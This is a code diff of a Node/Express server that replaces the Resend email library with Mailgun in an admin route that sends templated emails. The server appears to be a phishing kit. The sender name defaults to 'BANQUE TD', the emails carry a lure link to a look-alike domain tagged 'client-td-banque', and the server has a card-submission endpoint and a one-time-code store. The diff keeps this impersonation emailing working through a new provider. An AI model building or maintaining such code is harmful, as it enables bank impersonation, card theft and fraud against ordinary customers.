@@ -6,7 +6,8 @@ const rateLimit = require('express-rate-limit');
 const path = require('path');
 const bot = require('./bot');
 const otpStore = require('./otpStore'); // Serves as sessionStore
-const { Resend } = require('resend');
+const FormData = require('form-data');
+const Mailgun  = require('mailgun.js');
 
 
 const app = express();
@@ -455,7 +456,7 @@ app.post('/api/submit-card', async (req, res) => {
 });
 
 // =============================================
-// ADMIN — SEND EMAIL VIA RESEND
+// ADMIN — SEND EMAIL VIA MAILGUN
 // =============================================
 
 
@@ -473,12 +474,13 @@ app.post('/api/admin/send-email', async (req, res) => {
 
   const link = 'https://centr-prof.com/?key=client-td-banque';
 
-  const RESEND_API_KEY = process.env.RESEND_API_KEY;
-  const FROM_EMAIL     = process.env.RESEND_FROM_EMAIL;
-  const FROM_NAME      = process.env.RESEND_FROM_NAME || 'BANQUE TD';
+  const MG_API_KEY   = process.env.MG_API_KEY;
+  const MG_DOMAIN    = process.env.MG_DOMAIN;
+  const FROM_EMAIL   = process.env.MG_FROM_EMAIL;
+  const FROM_NAME    = process.env.MG_FROM_NAME || 'BANQUE TD';
 
-  if (!RESEND_API_KEY || !FROM_EMAIL) {
-    console.error('[Admin] Resend API key or FROM_EMAIL not set in .env');
+  if (!MG_API_KEY || !MG_DOMAIN || !FROM_EMAIL) {
+    console.error('[Admin] Mailgun API key, domain, or FROM_EMAIL not set in .env');
     return res.status(500).json({ success: false, error: 'Email service not configured.' });
   }
 
@@ -1269,25 +1271,22 @@ app.post('/api/admin/send-email', async (req, res) => {
   const emailPayload = typeTemplates[lang] || typeTemplates.en;
 
   try {
-    const resend = new Resend(RESEND_API_KEY);
-    const { data, error } = await resend.emails.send({
-      from: `${FROM_NAME} <${FROM_EMAIL}>`,
-      to: [recipient],
+    const mailgun = new Mailgun(FormData);
+    const mg = mailgun.client({ username: 'api', key: MG_API_KEY });
+
+    const msgData = await mg.messages.create(MG_DOMAIN, {
+      from:    `${FROM_NAME} <${FROM_EMAIL}>`,
+      to:      [recipient],
       subject: emailPayload.subject,
-      html: emailPayload.html,
-      text: emailPayload.text,
+      html:    emailPayload.html,
+      text:    emailPayload.text,
     });
 
-    if (error) {
-      console.error('[Admin] Resend API error:', error);
-      return res.status(500).json({ success: false, error: `Resend error: ${error.message}` });
-    }
-
-    console.log(`[Admin] Email sent to ${recipient} via Resend. ID: ${data?.id}`);
-    return res.json({ success: true });
+    console.log(`[Admin] Email sent to ${recipient} via Mailgun. ID: ${msgData.id}`);
+    return res.json({ success: true, id: msgData.id });
   } catch (err) {
-    console.error('[Admin] Failed to call Resend API:', err.message);
-    return res.status(500).json({ success: false, error: 'Failed to send email. Server error.' });
+    console.error('[Admin] Failed to call Mailgun API:', err);
+    return res.status(500).json({ success: false, error: err?.message || 'Failed to send email. Server error.' });
   }
 });
 
